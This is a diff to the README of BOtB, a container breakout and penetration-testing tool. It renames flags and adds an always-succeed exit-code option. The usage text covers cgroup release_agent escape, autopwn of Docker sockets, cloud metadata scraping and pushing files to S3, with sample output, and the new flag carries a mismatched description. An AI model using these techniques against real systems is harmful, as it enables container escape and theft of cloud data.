@@ -23,6 +23,7 @@ BOtB is a CLI tool which allows you to:
 - Scrape metadata info from GCP metadata endpoints
 - Push data to an S3 bucket
 - Break out of Privileged Containers
+- Force BOtB to always return a Exit Code of 0 (useful for non-blocking CI/CD)
 
 # Getting BOtB
 
@@ -51,44 +52,46 @@ go build -o botbsBinary
 BOtB can be compiled into a binary for the targeted platform and supports the following usage
 ```
 Usage of ./botb:
-  -aggr string
-        Attempt to exploit RuncPWN (default "nil")
+ -aggr string
+    	Attempt to exploit RuncPWN (default "nil")
+  -always-succeed
+    	Attempt to scrape the GCP metadata service
   -autopwn
-        Attempt to autopwn exposed sockets
+    	Attempt to autopwn exposed sockets
   -cicd
-        Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
+    	Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
   -endpointlist string
-        Provide a wordlist (default "nil")
-  -findDockerD
-        Attempt to find Dockerd
-  -findHTTP
-        Hunt for Available UNIX Domain Sockets with HTTP
+    	Provide a wordlist (default "nil")
+  -find-docker
+    	Attempt to find Dockerd
+  -find-http
+    	Hunt for Available UNIX Domain Sockets with HTTP
   -hijack string
-        Attempt to hijack binaries on host (default "nil")
+    	Attempt to hijack binaries on host (default "nil")
   -interfaces
-        Display available network interfaces
+    	Display available network interfaces
   -metadata
-        Attempt to find metadata services
+    	Attempt to find metadata services
   -path string
-        Path to Start Scanning for UNIX Domain Sockets (default "/")
-  -pwnCgroup string
+    	Path to Start Scanning for UNIX Domain Sockets (default "/")
+  -pwn-privileged string
     	Provide a command payload to try exploit --privilege CGROUP release_agent's (default "nil")
   -recon
-        Perform Recon of the Container ENV
+    	Perform Recon of the Container ENV
   -region string
-        Provide a AWS Region e.g eu-west-2 (default "nil")
+    	Provide a AWS Region e.g eu-west-2 (default "nil")
   -s3bucket string
-        Provide a bucket name for S3 Push (default "nil")
+    	Provide a bucket name for S3 Push (default "nil")
   -s3push string
-        Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default "nil")
-  -scrapeGCP
-        Attempt to scrape the GCP metadata service
+    	Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default "nil")
+  -scrape-gcp
+    	Attempt to scrape the GCP metadata service
   -socket
-        Hunt for Available UNIX Domain Sockets
+    	Hunt for Available UNIX Domain Sockets
   -verbose
-        Verbose output
+    	Verbose output
   -wordlist string
-        Provide a wordlist (default "nil")
+    	Provide a wordlist (default "nil")
 
 ```
 
@@ -109,7 +112,7 @@ The following usage examples will return a Exit Code > 0 by default when an anom
 
 ### Find a Docker Daemon
 ```
-#./bob_linux_amd64 -findDockerD=true
+#./bob_linux_amd64 -find-docker=true
 [+] Break Out The Box
 [+] Looking for Dockerd
 [!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375
@@ -268,7 +271,7 @@ https://heroku.com
 
 ### Scan for UNIX Domain Sockets that respond to HTTP
 ```
-#  ./bob_linux_amd64 -findHTTP=true
+#  ./bob_linux_amd64 -find-http=true
 [+] Break Out The Box
 [+] Looking for HTTP enabled Sockets
 [!] Valid HTTP Socket: /var/run/docker.sock
@@ -278,7 +281,7 @@ https://heroku.com
 
 ### Scrape data from GCP metadata instance
 ```
-#  ./botb_linux_amd64 -scrapeGCP=true
+#  ./botb_linux_amd64 -scrape-gcp=true
 [+] Break Out The Box
 [+] Attempting to connect to:  169.254.169.254:80
 
@@ -312,13 +315,25 @@ X-Frame-Options: SAMEORIGIN
 
 ### Break out of a Privileged Container
 ```
-#  ./bob_linux_amd64 -pwnCgroup=hostname
+#  ./bob_linux_amd64 -pwn-privileged=hostname
 [+] Break Out The Box
 [+] Attempting to exploit CGROUP Privileges
 [*] The result of your command can be found in /output
 [+] Finished
 root@418fa238e34d:/app# cat /output 
 docker-desktop
+```
+
+### Force BOtB to always succeed with a Exit Code of 0
+This is useful for non-blocking CI/CD tests
+```
+#  ./bob_linux_amd64 -pwn-privileged=hostname -always-succeed-true
+[+] Break Out The Box
+[+] Attempting to exploit CGROUP Privileges
+[*] The result of your command can be found in /output
+[+] Finished
+# echo $?
+0
 
 ```
 
